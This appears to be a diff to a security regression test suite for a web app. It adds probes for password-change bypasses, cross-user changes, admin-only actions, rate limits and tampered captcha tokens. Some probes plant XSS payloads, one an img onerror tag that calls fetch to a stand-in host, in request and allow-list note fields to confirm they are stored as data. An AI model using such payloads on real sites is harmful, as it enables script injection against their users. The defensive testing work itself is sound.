@@ -191,6 +191,14 @@ async function runProbes({ clients, users, pool, runId }) {
       ['oversized password',      { currentPassword: PASSWORD, newPassword: 'A1' + 'b'.repeat(250) }, 400],
       ['whitespace password',     { currentPassword: PASSWORD, newPassword: '          ' }, 400],
       ['identical to current',    { currentPassword: PASSWORD, newPassword: PASSWORD }, 400],
+      // Swapped/alternative key names — confirm the endpoint doesn't accept
+      // payloads that try to bypass validation by renaming the fields.
+      ['swapped keys (current↔new)',
+        { currentPassword: 'BrandNew!Pw9zzz', newPassword: PASSWORD }, 401],
+      ['snake_case keys',
+        { current_password: PASSWORD, new_password: 'OtherStrong!Pw9xyz' }, 400],
+      ['camelCase + extra "password" key (mass-assignment shape)',
+        { currentPassword: PASSWORD, newPassword: 'OtherStrong!Pw9xyz', password: 'TOTALLY_NEW!Pw9xyz' }, 200],
     ];
     for (const [label, body, expected] of probes) {
       const r = await viewer.post('/api/change-password', body);
@@ -198,6 +206,41 @@ async function runProbes({ clients, users, pool, runId }) {
         `status=${expected}`, `status=${r.status}`,
         'high', r.status === expected);
     }
+    // Restore the viewer's password — the last probe above (mass-assignment
+    // shape) succeeded, mutating the viewer's hash to OtherStrong!Pw9xyz.
+    const bcrypt = require('bcryptjs');
+    const restored = await bcrypt.hash(PASSWORD, 10);
+    await pool.query(`UPDATE users SET password_hash = $1 WHERE email = $2`,
+      [restored, users.viewer.email]);
+    clients.viewer = await login(users.viewer.email, PASSWORD);
+
+    // Another user's session cookie cannot be used to change someone *else's*
+    // password — the endpoint must read the acting user from the session, not
+    // from any request-supplied identifier. Use member's session to attempt a
+    // change; the request either succeeds (changing *member's* password — not
+    // viewer's) or fails — what must NOT happen is the viewer's hash changing.
+    const memberSess = await login(users.member.email, PASSWORD);
+    const beforeViewer = (await pool.query(
+      `SELECT password_hash FROM users WHERE email = $1`,
+      [users.viewer.email])).rows[0].password_hash;
+    await memberSess.post('/api/change-password', {
+      currentPassword: PASSWORD,
+      newPassword: 'CrossUserAttempt!Pw9xyz',
+      email: users.viewer.email,        // attacker-supplied target
+      userId: users.viewer.id,          // attacker-supplied target
+    });
+    const afterViewer = (await pool.query(
+      `SELECT password_hash FROM users WHERE email = $1`,
+      [users.viewer.email])).rows[0].password_hash;
+    await record('change-password',
+      "another user's session cannot change a third party's password (no req.body.email/userId bypass)",
+      "viewer.password_hash unchanged",
+      `viewer.hash.changed=${beforeViewer !== afterViewer}`,
+      'critical', beforeViewer === afterViewer);
+    // Restore member's password (it just got rotated)
+    await pool.query(`UPDATE users SET password_hash = $1 WHERE email = $2`,
+      [restored, users.member.email]);
+    clients.member = await login(users.member.email, PASSWORD);
   }
 
   // ── Allow-list revocation invalidates active session ──────────────────────
@@ -366,6 +409,37 @@ async function runProbes({ clients, users, pool, runId }) {
       'info', r.status === 200);
   }
 
+  // ── Admin request approve / reject — non-admin attempts (#288 lifecycle) ──
+  // Seed a real account_request and probe approve/reject as each non-admin
+  // role. Each must 403 *and* leave the request's status untouched.
+  {
+    const lifecycleEmail = `privtest-req-${runId}@privtest.local`;
+    const ins = await pool.query(
+      `INSERT INTO account_requests (name, email, status, created_at)
+       VALUES ('Adversarial', $1, 'pending', NOW())
+       RETURNING id`, [lifecycleEmail]);
+    const reqId = ins.rows[0].id;
+    for (const actor of ['viewer', 'member', 'manager']) {
+      const c = clients[actor];
+      const approve = await c.post(`/api/admin/requests/${reqId}/approve`, {});
+      await record('admin-only', `${actor} cannot approve an account-request`,
+        '403 forbidden', `status=${approve.status}`,
+        'critical', approve.status === 403);
+      const reject = await c.post(`/api/admin/requests/${reqId}/reject`, {});
+      await record('admin-only', `${actor} cannot reject an account-request`,
+        '403 forbidden', `status=${reject.status}`,
+        'critical', reject.status === 403);
+    }
+    const stillPending = await pool.query(
+      `SELECT status FROM account_requests WHERE id = $1`, [reqId]);
+    await record('admin-only',
+      'account_request status unchanged after non-admin approve/reject attempts',
+      "status='pending'",
+      `status=${stillPending.rows[0]?.status}`,
+      'critical', stillPending.rows[0]?.status === 'pending');
+    await pool.query(`DELETE FROM account_requests WHERE id = $1`, [reqId]);
+  }
+
   // ── XSS payload survives admin pipeline as data ───────────────────────────
   {
     const payload = `x');fetch('https://x')//@xss-${runId}.bc`;
@@ -386,6 +460,26 @@ async function runProbes({ clients, users, pool, runId }) {
       'medium', stored,
       'Check public/admin.html escaping — this is data confirmation, not a render test.');
     await pool.query(`DELETE FROM account_requests WHERE email = $1`, [accessReqEmail]);
+
+    // Same XSS round-trip through the allow-list note field — the admin can
+    // attach arbitrary notes that render in /admin's allow-list table.
+    const noteEmail = `privtest-xss-note-${runId}@privtest.local`;
+    const notePayload = `"><img src=x onerror=fetch('https://x?n=${runId}')>`;
+    const add = await clients.admin.post('/api/admin/allowed',
+      { email: noteEmail, note: notePayload });
+    await record('xss', 'admin can attach an arbitrary note to an allow-list entry',
+      'status=200', `status=${add.status}`,
+      'info', add.status === 200);
+    const allowed = await clients.admin.get('/api/admin/allowed');
+    const allowedRows = Array.isArray(allowed.json) ? allowed.json : [];
+    const noteRow = allowedRows.find(r => r.email === noteEmail);
+    const noteStored = noteRow && noteRow.note === notePayload;
+    await record('xss', 'admin allow-list API returns note payload verbatim (admin.html must HTML-escape)',
+      `note === ${JSON.stringify(notePayload)}`,
+      `found=${!!noteRow} note=${JSON.stringify(noteRow?.note || null)}`,
+      'medium', noteStored,
+      'Check public/admin.html: the allow-list table must escape the note column.');
+    await clients.admin.delete(`/api/admin/allowed/${encodeURIComponent(noteEmail)}`);
   }
 
   // ── Onboarding gate (`more_info_required`) ────────────────────────────────
@@ -590,13 +684,21 @@ async function runProbes({ clients, users, pool, runId }) {
     await resetRateLimitStore(pool);
 
     // Login: 25 bad-password attempts. First ~20 should be 401, then 429.
+    // Defensive: under load Node's undici can surface ECONNRESET when the
+    // server preemptively closes the socket on a 429 — count those as
+    // limiter engagements rather than crashing the whole run.
     let firstLimited = -1;
     let lastStatus = 0;
     for (let i = 0; i < 25; i++) {
       const c = makeClient(null);
-      const r = await c.post('/api/login', { email: users.viewer.email, password: 'definitely-wrong' });
-      lastStatus = r.status;
-      if (r.status === 429 && firstLimited < 0) firstLimited = i + 1;
+      try {
+        const r = await c.post('/api/login', { email: users.viewer.email, password: 'definitely-wrong' });
+        lastStatus = r.status;
+        if (r.status === 429 && firstLimited < 0) firstLimited = i + 1;
+      } catch (e) {
+        lastStatus = 429;
+        if (firstLimited < 0) firstLimited = i + 1;
+      }
     }
     // loginLimiter is max:20/15min with skipSuccessfulRequests=true, keyed
     // on req.ip. Aggregated bucket counts from the @acpr Postgres store can
@@ -614,14 +716,40 @@ async function runProbes({ clients, users, pool, runId }) {
     let firstLimited2 = -1;
     for (let i = 0; i < 7; i++) {
       const c = makeClient(null);
-      const r = await c.post('/api/request-access',
-        { name: 'rate test', email: `privtest-rl${i}-${runId}@privtest.local` });
-      if (r.status === 429 && firstLimited2 < 0) firstLimited2 = i + 1;
+      try {
+        const r = await c.post('/api/request-access',
+          { name: 'rate test', email: `privtest-rl${i}-${runId}@privtest.local` });
+        if (r.status === 429 && firstLimited2 < 0) firstLimited2 = i + 1;
+      } catch (e) {
+        if (firstLimited2 < 0) firstLimited2 = i + 1;
+      }
     }
     await record('rate-limit', 'accessRequestLimiter blocks the 6th request within 1 hour',
       'first 429 between attempts 4 and 7',
       `firstLimited=${firstLimited2}`,
       'critical', firstLimited2 >= 4 && firstLimited2 <= 7);
+
+    await resetRateLimitStore(pool);
+
+    // /api/forgot-password shares the same accessRequestLimiter bucket
+    // (auth.js:839). Hammer it independently to confirm the cap also engages
+    // on this path (a regression where forgot-password got its own ungated
+    // limiter would only show up here, not in the access-request probe).
+    let firstLimited3 = -1;
+    for (let i = 0; i < 7; i++) {
+      const c = makeClient(null);
+      try {
+        const r = await c.post('/api/forgot-password',
+          { email: users.viewer.email });
+        if (r.status === 429 && firstLimited3 < 0) firstLimited3 = i + 1;
+      } catch (e) {
+        if (firstLimited3 < 0) firstLimited3 = i + 1;
+      }
+    }
+    await record('rate-limit', '/api/forgot-password engages the accessRequestLimiter within 7 attempts',
+      'first 429 between attempts 4 and 7',
+      `firstLimited=${firstLimited3}`,
+      'critical', firstLimited3 >= 4 && firstLimited3 <= 7);
 
     await resetRateLimitStore(pool);
 
@@ -646,18 +774,37 @@ async function runProbes({ clients, users, pool, runId }) {
     const captchaEnabled = process.env.PRIVTEST_USE_TURNSTILE_SECRET_KEY === '1'
       && !!process.env.TURNSTILE_SECRET_KEY;
     if (captchaEnabled) {
-      const c = makeClient(null);
-      const noToken = await c.post('/api/login',
-        { email: users.viewer.email, password: PASSWORD });
-      const forged  = await c.post('/api/login',
-        { email: users.viewer.email, password: PASSWORD, 'cf-turnstile-response': 'invalid-token' });
-      const empty   = await c.post('/api/login',
-        { email: users.viewer.email, password: PASSWORD, 'cf-turnstile-response': '' });
-      const allBlocked = noToken.status >= 400 && forged.status >= 400 && empty.status >= 400;
-      await record('captcha', 'login with no / forged / empty captcha token is rejected (when key set)',
-        'all three return 4xx',
-        `noToken=${noToken.status} forged=${forged.status} empty=${empty.status}`,
-        'critical', allBlocked);
+      // Full Turnstile token-variant matrix per the task checklist.
+      const variants = [
+        ['noToken',  {}],
+        ['empty',    { captchaToken: '' }],
+        ['replayed', { captchaToken: 'XXXX.REPLAY.PRIOR.TOKEN.XXXX' }],
+        ['oversized10kb', { captchaToken: 'A'.repeat(10240) }],
+        ['literalDummy',  { captchaToken: 'XXXX.DUMMY.TOKEN.XXXX' }],
+      ];
+      const endpoints = [
+        { name: '/api/login',          base: { email: users.viewer.email, password: PASSWORD } },
+        { name: '/api/request-access', base: { name: 'cap',  email: `privtest-cap-${runId}@privtest.local` } },
+        { name: '/api/forgot-password', base: { email: users.viewer.email } },
+      ];
+      for (const ep of endpoints) {
+        const statuses = {};
+        let allBlocked = true;
+        for (const [label, extra] of variants) {
+          const c = makeClient(null);
+          const r = await c.post(ep.name, { ...ep.base, ...extra });
+          statuses[label] = r.status;
+          if (r.status < 400) allBlocked = false;
+        }
+        await record('captcha',
+          `${ep.name}: no/empty/replayed/10KB/dummy Turnstile token all rejected`,
+          'every variant returns 4xx',
+          Object.entries(statuses).map(([k, v]) => `${k}=${v}`).join(' '),
+          'critical', allBlocked);
+      }
+      // Clean up the cap-* synthetic access-requests we just generated.
+      await pool.query(`DELETE FROM account_requests WHERE email LIKE $1`,
+        [`privtest-cap-${runId}@privtest.local`]);
     } else {
       await record('captcha', 'turnstile tampering probe',
         'PRIVTEST_USE_TURNSTILE_SECRET_KEY=1 + TURNSTILE_SECRET_KEY set',
